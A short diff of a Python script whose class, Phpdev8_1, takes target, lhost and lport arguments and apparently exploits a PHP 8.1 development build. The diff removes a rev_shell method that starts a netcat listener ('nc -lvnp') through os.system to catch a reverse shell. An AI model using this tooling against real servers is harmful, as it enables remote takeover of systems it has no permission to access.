@@ -4,7 +4,6 @@ import base64
 import re
 import threading
 import time
-import os
 
 class Phpdev8_1():
     def __init__(self,target,lhost,lport):
@@ -36,10 +35,6 @@ class Phpdev8_1():
         else:
             fixed_url = self.target + "/"
             return fixed_url
-
-    def rev_shell(self):
-        net_cat = "nc -lvnp " + self.lport
-        os.system(net_cat)
 
     def base64encode(self,string):
         string_bytes = string.encode("ascii")
